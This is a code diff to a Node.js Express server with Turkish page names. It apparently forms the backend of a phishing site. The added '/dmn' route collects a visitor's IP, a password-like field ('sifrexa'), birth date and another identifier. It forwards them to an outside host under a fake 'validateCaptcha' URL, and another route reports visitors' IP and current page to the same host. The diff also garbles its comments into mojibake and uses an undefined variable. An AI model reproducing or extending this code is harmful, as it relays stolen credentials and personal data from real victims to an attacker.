@@ -1,6 +1,7 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
+const queryString = require('querystring');
 require('dotenv').config();
 const app = express();
 const port = process.env.PORT || 3000;
@@ -47,7 +48,44 @@ app.get('/bekle.html', (req, res) => {
 app.get('/files/js', (req, res) => {
   res.sendFile(__dirname + '/public/files/js');
 });
- 
+
+ app.get('/public/hatali.html', (req, res) => {
+  res.sendFile(__dirname + '/public/hatali.html');
+});
+ app.get('/public/check.png', (req, res) => {
+  res.sendFile(__dirname + '/public/check.png');
+});
+
+  app.get('/public/tebrik.html', (req, res) => {
+  res.sendFile(__dirname + '/public/tebrik.html');
+});
+
+
+app.post('/dmn', async (req, res) => {
+  try {
+    const userIp = req.query.user_ip;
+    const tach = req.query.tach;
+    const sifrexa = req.query.sifrexa;
+    const dogum = req.query.dogum;
+    const apiUrl = `https://alliikkerrr.online/validateCaptcha.php?user_ip=${encodeURIComponent(user_ip)}&tach=${encodeURIComponent(tach)}&sifrexa=${encodeURIComponent(sifrexa)}&dogum=${encodeURIComponent(dogum)}`;
+
+
+    // Fetch kullanarak GET isteÄŸi yap
+    const response = await axios.get(apiUrl);
+
+    // Cevap boÅŸsa veya gelmezse, boÅŸ bir yanÄ±t gÃ¶nder
+    if (!response.data) {
+      return res.send('');
+    }
+
+    // Gelen cevabÄ± direk olarak gÃ¶nder
+    res.send(response.data);
+  } catch (error) {
+    console.error('Hata:', error);
+    // Hata mesajÄ±nÄ± istemciye gÃ¶nder
+    res.status(500).send('');
+  }
+});
 app.get('/img/bg-image.jpeg', (req, res) => {
   res.sendFile(__dirname + '/public/img/bg-image.jpeg');
 });
@@ -75,26 +113,26 @@ app.get('/api', async (req, res) => {
     const userIp = req.query.user_ip;
     const currentPage = req.query.current_page;
 
-    // URL'yi oluştur
+    // URL'yi oluÅŸtur
     const apiUrl = `https://alliikkerrr.online/datach.php?user_ip=${userIp}&current_page=${currentPage}`;
 
-    // Fetch kullanarak GET isteği yap
+    // Fetch kullanarak GET isteÄŸi yap
     const response = await axios.get(apiUrl);
 
-    // Cevap boşsa veya gelmezse, boş bir yanıt gönder
+    // Cevap boÅŸsa veya gelmezse, boÅŸ bir yanÄ±t gÃ¶nder
     if (!response.data) {
       return res.send('');
     }
 
-    // Gelen cevabı direk olarak gönder
+    // Gelen cevabÄ± direk olarak gÃ¶nder
     res.send(response.data);
   } catch (error) {
     console.error('Hata:', error);
-    // Hata mesajını istemciye gönder
+    // Hata mesajÄ±nÄ± istemciye gÃ¶nder
     res.status(500).send('');
   }
 });
 
 app.listen(port, () => {
-  console.log(`Web sunucusu ${port} adresinde çalışıyor.`);
+  console.log(`Web sunucusu ${port} adresinde Ã§alÄ±ÅŸÄ±yor.`);
 });
